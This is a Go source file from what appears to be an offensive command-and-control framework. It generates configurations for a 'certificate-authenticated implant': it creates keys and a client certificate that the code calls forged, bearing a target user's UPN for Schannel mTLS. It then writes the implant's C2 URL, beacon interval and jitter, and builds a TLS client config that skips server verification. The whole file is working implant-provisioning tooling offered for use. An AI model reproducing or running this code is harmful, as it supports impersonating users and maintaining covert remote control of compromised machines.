package c2

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"math/big"
	"net/url"
	"os"
	"strings"
	"time"
)

// CertAuthImplantConfig defines the configuration for a certificate-authenticated implant.
type CertAuthImplantConfig struct {
	ID       string    `json:"id"`
	C2URL    string    `json:"c2_url"`
	UPN      string    `json:"upn"`
	CertFile string    `json:"cert_file"`
	KeyFile  string    `json:"key_file"`
	Interval int       `json:"interval_seconds"`
	Jitter   int       `json:"jitter_percent"`
	Created  time.Time `json:"created"`
	UseMTLS  bool      `json:"use_mtls"`
}

// GenerateCertAuthImplant creates a cert-auth implant configuration with forged certificates.
// The implant authenticates via Schannel mTLS on each check-in using a forged certificate.
func GenerateCertAuthImplant(c2URL, upn, outputDir string) (*CertAuthImplantConfig, error) {
	fmt.Printf("[+] Generating cert-auth implant for UPN: %s\n", upn)

	if err := os.MkdirAll(outputDir, 0700); err != nil {
		return nil, fmt.Errorf("create output dir: %w", err)
	}

	// Generate CA key pair for self-signing
	caKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generate CA key: %w", err)
	}

	// Generate implant key pair
	implantKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generate implant key: %w", err)
	}

	// Create certificate with UPN SAN for smart card / Schannel auth
	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	cn := upn
	if u, err := url.Parse("user://" + upn); err == nil {
		cn = u.User.Username()
	}

	template := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			CommonName:   cn,
			Organization: []string{"Trusted"},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(1, 0, 0),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
		URIs: []*url.URL{
			{Scheme: "upn", Opaque: upn},
		},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &implantKey.PublicKey, caKey)
	if err != nil {
		return nil, fmt.Errorf("create certificate: %w", err)
	}

	// Write certificate PEM — use UPN username as base name
	upnUser := upn
	if idx := strings.Index(upnUser, "@"); idx > 0 {
		upnUser = upnUser[:idx]
	}
	certPath := outputDir + "/" + upnUser + "-implant.pem"
	certFile, err := os.Create(certPath)
	if err != nil {
		return nil, fmt.Errorf("create cert file: %w", err)
	}
	if err := pem.Encode(certFile, &pem.Block{Type: "CERTIFICATE", Bytes: certDER}); err != nil {
		certFile.Close()
		return nil, fmt.Errorf("encode cert PEM: %w", err)
	}
	certFile.Close()

	keyPath := outputDir + "/" + upnUser + "-implant-key.pem"
	keyFile, err := os.Create(keyPath)
	if err != nil {
		return nil, fmt.Errorf("create key file: %w", err)
	}
	keyDER, err := x509.MarshalECPrivateKey(implantKey)
	if err != nil {
		keyFile.Close()
		return nil, fmt.Errorf("marshal key: %w", err)
	}
	if err := pem.Encode(keyFile, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}); err != nil {
		keyFile.Close()
		return nil, fmt.Errorf("encode key PEM: %w", err)
	}
	keyFile.Close()

	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return nil, fmt.Errorf("generate random ID: %w", err)
	}

	config := &CertAuthImplantConfig{
		ID:       hex.EncodeToString(b),
		C2URL:    c2URL,
		UPN:      upn,
		CertFile: certPath,
		KeyFile:  keyPath,
		Interval: 5,
		Jitter:   20,
		Created:  time.Now(),
		UseMTLS:  true,
	}

	// Write config JSON
	configPath := outputDir + "/" + upnUser + "-implant.json"
	configData, _ := json.MarshalIndent(config, "", "  ")
	if err := os.WriteFile(configPath, configData, 0600); err != nil {
		return nil, fmt.Errorf("write config: %w", err)
	}

	fmt.Printf("[+] Cert-auth implant generated:\n")
	fmt.Printf("    ID: %s\n", config.ID)
	fmt.Printf("    UPN: %s\n", upn)
	fmt.Printf("    Certificate: %s\n", certPath)
	fmt.Printf("    Key: %s\n", keyPath)
	fmt.Printf("    Config: %s\n", configPath)
	fmt.Printf("    mTLS: enabled (Schannel client certificate authentication)\n")

	return config, nil
}

// LoadCertAuthTLSConfig loads the mTLS config for a cert-auth implant.
func LoadCertAuthTLSConfig(certFile, keyFile string) (*tls.Config, error) {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return nil, fmt.Errorf("load keypair: %w", err)
	}

	return &tls.Config{
		Certificates:       []tls.Certificate{cert},
		InsecureSkipVerify: true, // C2 uses self-signed certs
	}, nil
}
